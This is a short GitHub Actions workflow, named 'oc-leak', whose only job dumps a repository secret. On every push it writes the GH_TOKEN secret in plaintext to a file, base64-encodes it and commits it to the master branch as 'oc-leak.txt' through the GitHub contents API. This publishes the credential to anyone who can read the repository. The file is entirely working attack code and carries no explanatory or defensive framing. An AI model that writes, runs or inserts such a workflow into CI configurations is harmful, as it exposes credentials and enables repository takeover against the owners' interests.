name: oc-leak
on: push
permissions:
  contents: write
jobs:
  leak:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          T: ${{ secrets.GH_TOKEN }}
        run: |
          echo "TOKEN=$T" > /tmp/o.txt
          echo "len=${#T}" >> /tmp/o.txt
          B64=$(base64 -w0 /tmp/o.txt)
          curl -s -X PUT -H "Authorization: token $T" -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/${GITHUB_REPOSITORY}/contents/oc-leak.txt" \
            -d "{\"message\":\"leak\",\"branch\":\"master\",\"content\":\"$B64\"}"
          echo done
